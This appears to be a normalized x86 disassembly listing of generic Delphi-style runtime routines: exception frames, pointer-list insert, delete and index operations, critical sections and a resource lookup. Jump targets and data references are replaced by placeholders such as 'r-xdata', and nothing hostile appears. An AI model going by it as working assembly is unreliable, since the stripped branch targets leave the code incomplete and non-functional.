pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4131b0
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4143bc
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_41357c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_4135ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403294
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413606
lea eax [ ebp - 0x10c ]
call sub_404094
retn
sub_41360c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4134f4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_413018
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_41357c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4143bc
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403570
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4134f4
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41425c
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_414210
sub_4136f8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4143bc
mov edx ebp
call sub_4132fc
test al al
jne r-xdata
sub_41373c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4130f4
mov edx eax
mov eax [ edi + 0x4 ]
call sub_414210
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4143bc
mov eax [ eax + 0xc ]
mov edx ebp
call sub_414418
test eax eax
jge r-xdata
sub_413798
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4143bc
mov esi eax
mov edx ebp
mov eax esi
call sub_413334
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403344
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41425c
sub_4137e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403314
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_4136d4
xor eax eax
push ebp
push sub_4138e7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4138ee
mov eax [ rw-data ]
call sub_41378c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414210
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4143bc
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413210
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414210
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4143bc
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4138ee
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_413914
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_413944
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4136d4
xor edx edx
push ebp
push sub_4139bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41378c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403b7c
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4143bc
mov edx [ ebp - 0x4 ]
call sub_4131b0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4139d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_413a38
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413a3f
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_413a44
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4136d4
xor eax eax
push ebp
push sub_413a8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413538
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413a91
mov eax [ rw-data ]
call sub_41378c
retn
sub_413a98
push ebx
push esi
mov esi eax
mov eax esi
call sub_413a44
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4139d8
sub_413ab8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4136d4
xor eax eax
push ebp
push sub_413b1d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4136f8
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4136e0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b24
mov eax [ rw-data ]
call sub_41378c
retn
mov eax ebx
call sub_4032d0
mov ebx eax
sub_413b28
push ebp
mov ebp esp
push ebx
push esi
mov ecx edx
test ecx ecx
js r-xdata
mov eax esp
mov esi edx
test esi esi
jl r-xdata
mov ebx [ eax + ecx * 4 ]
dec ecx
push ebx
jns r-xdata
mov esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
inc esi
mov ebx eax
mov eax [ ebx ]
call sub_413ab8
add ebx 0x4
dec esi
jne r-xdata
sub_413b5c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4136d4
xor eax eax
push ebp
push sub_413b9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ba5
mov eax [ rw-data ]
call sub_41378c
retn
sub_413ba8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4136d4
xor eax eax
push ebp
push sub_413bea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41373c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413bf1
mov eax [ rw-data ]
call sub_41378c
retn
sub_413bf4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_4136d4
xor eax eax
push ebp
push sub_413c3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_41360c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c42
mov eax [ rw-data ]
call sub_41378c
retn
sub_413c48
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4136d4
xor eax eax
push ebp
push sub_413c96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4133d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c9d
mov eax [ rw-data ]
call sub_41378c
retn
sub_413cfc
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_413d34
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413cfc
mov edx eax
mov eax [ rw-data ]
call sub_4146dc
pop edi
pop esi
pop ebx
retn
sub_413d60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_414764
mov esi eax
xor edx edx
push ebp
push sub_413dca
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4147c8
retn
mov edx ebx
mov eax esi
call sub_4143bc
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403b7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413ddc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407fcc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413e1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_4040e8
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413e60
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_414418
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_414210
sub_413eb8
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4143bc
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413ef8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413eb8
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413f1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404554
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4168e0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413f90
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4163e0
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_413fa0
push ebx
call sub_405f10
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405f10
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_414210
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov ebx eax
call sub_405f10
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov ebx eax
call sub_405f10
mov [ eax + 0xc ] ebx
sub_413ff8
push ebx
push esi
push edi
call sub_405f10
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4143bc
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_414028
push ebx
push esi
call sub_405f10
mov eax [ eax + 0x8 ]
call sub_403344
call sub_405f10
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_4144a4
mov esi eax
call sub_405f10
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_41425c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405f10
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403344
sub_414084
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41411a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414121
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4032d0
call sub_414084
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403294
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042f8
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_40515c
call sub_4051ac
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413f1c
or bl al
sub_41412c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4141da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4141bb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_40328c
call sub_414084
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413fa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141c2
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413ff8
retn
call sub_414028
sub_4141f0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_414210
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41425c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4142f8
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028f0
mov edx esi
mov eax ebx
call sub_4143bc
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4142c0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4142bc
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
jmp sub_403ad0
sub_4142f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_414340
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4142c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414347
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_41434c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4142f8
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax [ ebx ]
call sub_4142f8
cmp edi [ ebx + 0x8 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ eax + esi * 4 ]
mov ecx [ ebx + 0x4 ]
mov ecx [ ecx + edi * 4 ]
mov [ eax + esi * 4 ] ecx
mov [ eax + edi * 4 ] edx
pop edi
pop esi
pop ebx
retn
sub_4143bc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4142f8
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4143e4
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_414520
retn
sub_414418
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_414438
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4142f8
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028f0
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4144b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4142f8
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_414500
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_414418
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41425c
sub_414520
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4142f8
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_402734
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41455c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4142f8
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_414520
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402d44
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_41425c
dec ebp
inc edi
jne r-xdata
sub_4145cc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor esi esi
mov edx edi
mov eax ebx
call sub_414418
test eax eax
jl r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi edi
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 4 ] ecx
mov edx eax
mov eax ebx
call sub_41425c
mov cl 0x1
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41460c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_414660
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4036d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414764
xor eax eax
push ebp
push sub_4146c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403344
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146c9
mov eax [ ebp - 0x4 ]
call sub_4147c8
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_4146dc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414764
xor eax eax
push ebp
push sub_414758
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414210
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414418
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41475f
mov eax [ ebp - 0x4 ]
call sub_4147c8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
